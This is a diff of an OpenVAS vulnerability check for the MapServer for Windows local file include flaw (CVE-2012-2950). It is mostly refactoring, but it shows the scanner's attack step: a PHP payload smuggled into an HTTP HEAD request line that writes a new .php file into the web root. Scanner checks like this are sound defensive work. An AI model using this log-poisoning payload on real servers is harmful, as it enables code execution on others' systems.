@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mapserver4win_53737.nasl 13238 2019-01-23 11:14:26Z cfischer $
+# $Id: gb_mapserver4win_53737.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # Mapserver for Windows Local File Include Vulnerability
 #
@@ -30,11 +30,11 @@ if(description)
   script_oid("1.3.6.1.4.1.25623.1.0.103602");
   script_bugtraq_id(53737);
   script_cve_id("CVE-2012-2950");
-  script_tag(name:"last_modification", value:"$Date: 2019-01-23 12:14:26 +0100 (Wed, 23 Jan 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2012-11-02 10:11:35 +0100 (Fri, 02 Nov 2012)");
   script_tag(name:"cvss_base", value:"9.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
-  script_version("$Revision: 13238 $");
+  script_version("$Revision: 13994 $");
   script_name("Mapserver for Windows Local File Include Vulnerability");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -69,24 +69,23 @@ include("http_keepalive.inc");
 include("misc_func.inc");
 
 port = get_http_port( default:80 );
-if( ! can_host_php( port:port ) ) exit( 0 );
+if( ! can_host_php( port:port ) )
+  exit( 0 );
 
-vtstring = get_vt_string( lowercase:TRUE );
 host = http_host_name( port:port );
 
 foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-  url = dir + "/index.phtml";
-  buf = http_get_cache( item:url, port:port );
+  buf = http_get_cache( item:dir + "/index.phtml", port:port );
 
   if( "<title>MS4W" >< buf ) {
 
-    url = dir + '/phpinfo.php';
-    req = http_get(item:url, port:port);
+    req = http_get(item:dir + "/phpinfo.php", port:port);
     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-    if("<title>phpinfo()" >!< buf)exit(0);
+    if("<title>phpinfo()" >!< buf)
+      exit(0);
 
     lines = split(buf);
 
@@ -100,9 +99,11 @@ foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
       }
     }
 
-    if(!path || strlen(path) < 1)exit(0);
+    if(!path || strlen(path) < 1)
+      exit(0);
 
-    file = vtstring + '_' + rand() + '.php';
+    vtstrings = get_vt_strings();
+    file = vtstrings["lowercase_rand"] + ".php";
     php = "<?php file_put_contents('../htdocs/" + file +"', '<?php phpinfo();?>'); ?>";
 
     req = string("HEAD ", php, dir, "/ HTTP/1.1\r\n",
